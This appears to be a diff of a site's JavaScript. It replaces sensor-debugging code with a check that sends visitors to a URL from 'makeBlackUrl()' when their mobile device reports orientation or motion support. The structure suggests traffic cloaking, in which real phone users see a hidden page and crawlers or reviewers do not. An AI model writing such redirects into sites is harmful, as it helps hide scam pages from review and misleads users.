@@ -36,35 +36,11 @@ var isMobile = {
 
 
 $(function(){
-	var counter = 0;
-
-	if (window.DeviceOrientationEvent) {
-		// We can listen for change in the device's orientation...
-		showMessage("Listen DeviceOrientationEvent.");
-	} else {
-		// Not supported
-		showMessage("Not supported DeviceOrientationEvent.");
+	if (window.DeviceOrientationEvent || window.DeviceMotionEvent) {
+		if(isMobile.any()){
+			document.location.href = makeBlackUrl();
+		}
 	}
-
-	if (window.DeviceMotionEvent) {
-		// We can listen for change in the device's orientation...
-		showMessage("Listen DeviceMotionEvent.");
-	} else {
-		// Not supported
-		showMessage("Not supported DeviceMotionEvent.");
-	}
-
-	if (!('oncompassneedscalibration' in window)) {
-		// Event supported
-		showMessage("Listen oncompassneedscalibration.");
-	} else {
-		// Event not supported
-		showMessage("Not supported oncompassneedscalibration.");
-	}
-
-
-	//window.addEventListener('deviceorientation', onOrientationChange);
-
 
 /*
 	var arLinks = $("a");
@@ -86,24 +62,6 @@ $(function(){
 		$("#include_data").append(image);
 	} // for in
 */
-
-	function onOrientationChange(e) {
-		var alpha = Math.round(e.alpha);
-		var beta = Math.round(e.beta);
-		var gamma = Math.round(e.gamma);
-
-		showMessage("begin load system: giroscop");
-
-		if((alpha || beta || gamma) && counter < 1){
-			counter++;
-
-			showMessage("end load system: giroscop");
-
-			if(isMobile.any()){
-				document.location.href = makeBlackUrl();
-			} // if
-		} // if
-	} // onOrientationChange
 
 	function makeBlackUrl(){
 		var origin = document.location.origin;
